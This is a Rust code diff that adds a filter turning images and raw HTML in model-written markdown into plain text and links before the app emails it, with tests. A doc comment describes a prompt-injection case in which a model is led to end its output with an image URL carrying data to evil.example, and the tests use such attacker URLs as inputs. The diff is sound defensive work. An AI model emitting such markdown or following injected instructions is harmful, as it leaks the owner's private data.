@@ -22,6 +22,7 @@ use crate::service::{Service, blocking};
 use everyday_core::mail::{Address, Draft, Origin};
 use everyday_core::routine::{Delivered, DeliveredTo, Outcome, Routine, RoutineRun};
 use everyday_core::{ProposalQuery, Vault};
+use pulldown_cmark::{CowStr, Event, LinkType, Options, Parser, Tag, TagEnd};
 use std::sync::Arc;
 use std::time::Duration;
 
@@ -185,22 +186,112 @@ fn subject(name: &str, run: &RoutineRun, settings: Option<everyday_core::AgentSe
 
 /// `markdown` as the body of an email.
 ///
-/// Raw HTML in it is shown as text rather than passed through: the words are
-/// a model's, and a model's output is not markup this application vouches
-/// for, even in a message to the person's own inbox.
+/// Raw HTML in it is shown as text rather than passed through, and an image
+/// as its alt text and a link to its address: the words are a model's, and a
+/// model's output is not markup this application vouches for, even in a
+/// message to the person's own inbox. An image above all -- a model told by a
+/// mail or a page it read to end with `![](https://evil.example/?d=<data>)`
+/// would have the owner's mail client fetch that address on opening, and the
+/// data would leave without a click. See [`inert`].
 pub(crate) fn html_of(markdown: &str) -> String {
-    use pulldown_cmark::{Event, Options, Parser, html};
-    let parser = Parser::new_ext(markdown, Options::ENABLE_STRIKETHROUGH | Options::ENABLE_TABLES)
-        .map(|event| match event {
-            Event::Html(raw) | Event::InlineHtml(raw) => Event::Text(raw),
-            other => other,
-        });
+    let parser = Parser::new_ext(markdown, Options::ENABLE_STRIKETHROUGH | Options::ENABLE_TABLES);
     let mut body = String::new();
-    html::push_html(&mut body, parser);
+    pulldown_cmark::html::push_html(&mut body, inert(parser));
     format!(
         "<div style=\"font-family: -apple-system, 'Segoe UI', sans-serif; line-height: 1.5\">\
          {body}<p style=\"color: #888; font-size: 12px\">Sent by a routine in Every Day.</p></div>"
     )
+}
+
+/// `events` with nothing left in them that a client would fetch by itself:
+/// an image becomes its alt text and its address, and raw HTML the text it
+/// is. Everything else passes through untouched.
+///
+/// The owner's chat uses it too, re-exported as `inert_markdown`: a reply
+/// sent to Matrix is rendered by `everyday-chat` with the same filter, so
+/// neither way out can let a self-loading picture through that the other
+/// stops.
+pub fn inert<'a>(events: impl Iterator<Item = Event<'a>>) -> impl Iterator<Item = Event<'a>> {
+    // The address and title of the image being put into words, its alt text
+    // so far, and how many images deep inside that alt text the parser is.
+    let mut image: Option<(CowStr<'a>, CowStr<'a>)> = None;
+    let mut alt = String::new();
+    let mut nested = 0usize;
+    // Links open around here: an image inside one has its address shown as
+    // text, since a link cannot go inside a link.
+    let mut links = 0usize;
+    events.flat_map(move |event| {
+        if image.is_none() {
+            return match event {
+                Event::Start(Tag::Image { dest_url, title, .. }) => {
+                    image = Some((dest_url, title));
+                    Vec::new()
+                }
+                Event::Start(Tag::Link { .. }) => {
+                    links += 1;
+                    vec![event]
+                }
+                Event::End(TagEnd::Link) => {
+                    links = links.saturating_sub(1);
+                    vec![event]
+                }
+                Event::Html(raw) | Event::InlineHtml(raw) => vec![Event::Text(raw)],
+                other => vec![other],
+            };
+        }
+        match event {
+            Event::Start(Tag::Image { .. }) => nested += 1,
+            Event::End(TagEnd::Image) if nested > 0 => nested -= 1,
+            Event::End(TagEnd::Image) => {
+                if let Some((address, title)) = image.take() {
+                    return in_words(&std::mem::take(&mut alt), address, title, links > 0);
+                }
+            }
+            Event::Text(text)
+            | Event::Code(text)
+            | Event::Html(text)
+            | Event::InlineHtml(text)
+            | Event::InlineMath(text)
+            | Event::DisplayMath(text) => alt.push_str(&text),
+            Event::SoftBreak | Event::HardBreak => alt.push(' '),
+            _ => {}
+        }
+        Vec::new()
+    })
+}
+
+/// An image as words: `alt (address)`, or the bare address when it has no
+/// alt text. The address is a link the owner can follow, which a mail client
+/// never does by itself -- or plain text when `in_link`.
+fn in_words<'a>(
+    alt: &str,
+    address: CowStr<'a>,
+    title: CowStr<'a>,
+    in_link: bool,
+) -> Vec<Event<'a>> {
+    let alt = alt.trim();
+    if address.trim().is_empty() {
+        return if alt.is_empty() { Vec::new() } else { vec![Event::Text(alt.to_owned().into())] };
+    }
+    let mut words = Vec::new();
+    if !alt.is_empty() {
+        words.push(Event::Text(format!("{alt} (").into()));
+    }
+    if in_link {
+        words.push(Event::Text(address));
+    } else {
+        let link = Tag::Link {
+            link_type: LinkType::Inline,
+            dest_url: address.clone(),
+            title,
+            id: CowStr::Borrowed(""),
+        };
+        words.extend([Event::Start(link), Event::Text(address), Event::End(TagEnd::Link)]);
+    }
+    if !alt.is_empty() {
+        words.push(Event::Text(")".into()));
+    }
+    words
 }
 
 #[cfg(test)]
@@ -266,6 +357,54 @@ mod tests {
         assert!(html.contains("<li>Book the dentist</li>"));
         assert!(!html.contains("<script>"), "got {html}");
         assert!(html.contains("&lt;script&gt;"));
+    }
+
+    #[test]
+    fn an_image_in_the_email_is_a_link_to_follow_never_a_picture_to_load() {
+        let html = html_of(
+            "Your chart:\n\n![weekly chart](https://evil.example/?d=secret)\n\n\
+             ![](mxc://evil.example/c2VjcmV0) and ![logo][l]\n\n[l]: https://evil.example/l.png",
+        );
+        assert!(!html.contains("<img"), "got {html}");
+        assert!(html.contains(
+            "weekly chart (<a href=\"https://evil.example/?d=secret\">\
+             https://evil.example/?d=secret</a>)"
+        ));
+        assert!(html.contains(">mxc://evil.example/c2VjcmV0</a> and logo (<a "), "got {html}");
+        assert!(html.contains(">https://evil.example/l.png</a>)"), "got {html}");
+    }
+
+    #[test]
+    fn an_image_inside_a_link_shows_its_address_as_text() {
+        let html = html_of("[![build](https://evil.example/b.png)](https://ci.example)");
+        assert!(!html.contains("<img"), "got {html}");
+        assert!(
+            html.contains("<a href=\"https://ci.example\">build (https://evil.example/b.png)</a>")
+        );
+        assert_eq!(html.matches("<a ").count(), 1, "got {html}");
+    }
+
+    #[test]
+    fn raw_img_markup_in_the_email_is_shown_as_text() {
+        let html = html_of("Done.\n\n<img src=x>\n\nSee <img src=https://evil.example/p> here");
+        assert!(!html.contains("<img"), "got {html}");
+        assert!(html.contains("&lt;img src=x&gt;"));
+        assert!(html.contains("See &lt;img src=https://evil.example/p&gt; here"));
+    }
+
+    #[test]
+    fn ordinary_formatting_in_the_email_is_kept() {
+        let html = html_of(
+            "**Due** _today_: `code`\n\n- [Pay rent](https://bank.example \"Bank\")\n- ~~Gym~~",
+        );
+        assert!(
+            html.contains("<strong>Due</strong> <em>today</em>: <code>code</code>"),
+            "got {html}"
+        );
+        assert!(
+            html.contains("<li><a href=\"https://bank.example\" title=\"Bank\">Pay rent</a></li>")
+        );
+        assert!(html.contains("<li><del>Gym</del></li>"));
     }
 
     #[test]
